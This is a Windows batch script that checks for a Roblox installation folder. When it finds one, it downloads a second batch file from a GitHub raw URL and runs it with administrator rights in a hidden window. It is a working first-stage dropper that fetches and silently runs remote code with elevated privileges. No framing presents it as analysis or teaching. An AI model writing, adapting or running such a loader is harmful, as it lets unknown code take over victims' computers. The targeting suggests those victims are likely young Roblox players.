@echo off
setlocal

:: Define the folder path and download URL
set "folderPath=%localappdata%\Roblox"
set "url=https://raw.githubusercontent.com/skibidzaa/tak/main/downloader.bat"
set "tempBatFile=%temp%\downloaded.bat"

:: Check if the folder exists
if exist "%folderPath%" (
    echo Folder exists. Downloading the .bat file...

    :: Download the .bat file using PowerShell
    powershell -Command "(New-Object Net.WebClient).DownloadFile('%url%', '%tempBatFile%')"

    :: Check if the download was successful
    if exist "%tempBatFile%" (
        echo Download complete. Running the .bat file as administrator...

        :: Run the downloaded .bat file as administrator in a hidden window
        powershell -Command "Start-Process cmd.exe -ArgumentList '/c %tempBatFile%' -Verb RunAs -WindowStyle Hidden"
    ) else (
        echo Failed to download the .bat file.
    )
) else (
    echo Folder does not exist. Exiting.
)

endlocal
